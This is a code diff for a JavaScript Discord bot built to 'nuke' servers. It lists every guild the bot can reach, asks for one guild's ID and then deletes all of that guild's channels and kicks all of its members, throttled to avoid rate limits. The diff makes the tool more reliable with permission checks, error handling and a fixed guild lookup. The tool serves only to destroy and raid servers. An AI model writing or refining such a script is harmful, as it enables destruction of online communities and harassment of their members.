@@ -37,6 +37,9 @@ client.once("ready", _ => {
 });
 
 
+/**
+ * @param {djs.Guild} g
+ */
 const nuke = async g => {
     g = await g.fetch();
 
@@ -44,23 +47,24 @@ const nuke = async g => {
     const channels = g.channels.cache;
 
     try {
-        let i = 0;
-        for (const channel of channels.values()) {
-            channel.delete();
-            i++;
+        for (const channel of channels.values()) {            
+            if ("deletable" in channel &&
+                channel.deletable) channel.delete();
 
-            if (i%5 === 0) await sleep(2000);
+            await sleep(300);
         }
 
-        i = 0;
         for (const member of members.values()) {
-            member.kick();
-            i++;
+            if (member.kickable) member.kick();
 
-            if (i%5 === 0) await sleep(2000);
+            await sleep(300);
         }
 
-    } finally { g.leave() }
+    } catch (e) {
+        console.error(e)
+    } finally { 
+        // g.leave() 
+    }
 };
 
 async function Main () {
@@ -69,13 +73,21 @@ async function Main () {
     ///////////////////////////////////////////////////////
     
     while (true) {
+        let tmp = "";
+        for (const g of (await client.guilds.fetch()).values())
+            tmp += "\"" + g.name + "\": " + g.id + "\n";
+        console.log(tmp);
+
         const id = prompt("Enter the ID of the guild you want to nuke: ");
-    
-        if (id in client.guilds.cache) {
-            const guild = client.guilds.cache.get(id);
-            
-            if (prompt(`Are you sure to nuke \`${guild.name}\`? (y/N): `).toLowerCase() === "y")
-                nuke(guild);
+        
+        const guild = client.guilds.cache.find((_, k) => k === id);
+        if (guild) {
+            if (prompt(`Are you sure to nuke \`${guild.name}\`? (y/N): `)
+                    .toLowerCase() === "y"
+            ) {
+                console.log("Started")
+                await nuke(guild);
+            }
         }
     
         else console.log("Guild not found.");
